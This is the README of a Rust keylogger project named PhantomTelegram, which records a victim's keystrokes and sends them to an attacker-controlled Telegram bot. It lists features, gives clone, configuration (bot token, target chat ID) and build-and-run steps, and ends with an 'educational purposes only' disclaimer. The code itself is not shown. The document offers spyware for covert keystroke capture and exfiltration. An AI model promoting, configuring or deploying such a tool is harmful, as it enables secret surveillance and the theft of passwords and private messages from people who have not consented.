# PhantomTelegram

**PhantomTelegram** is a lightweight keylogger that sends captured keystrokes to a specified Telegram bot using the Telegram Bot API. It uses `rdev` for key event listening and `reqwest` for HTTP requests.

## Features
- Captures keystrokes and processes them.
- Sends the captured input to a Telegram chat in near real-time.
- Uses rate limiting to prevent spamming the Telegram bot API.

## Getting Started
1. **Clone the Repo:**
   ```bash
   git clone https://github.com/XeinTDM/PhantomTelegram.git
   cd PhantomTelegram
   ```
2. **Set Your Config:**
   - Replace `BOT_TOKEN` with your Telegram bot token.
   - Replace `CHAT_ID` with your target chat ID.

3. **Build and Run:**
   - Install Rust if you don’t have it: [Rust Installation](https://www.rust-lang.org/tools/install).
   - Run the program:
     ```bash
     cargo run --release
     ```

## License
**PhantomTelegram** is licensed under [The Unlicense](LICENSE), so feel free to use, modify, and distribute it as you like. 

---

**Disclaimer:** This project is intended for educational and ethical purposes only. Unauthorized use, including but not limited to illegal activities, surveillance without consent, or any action that violates laws or personal privacy, is strictly prohibited. The author assumes no responsibility for misuse.
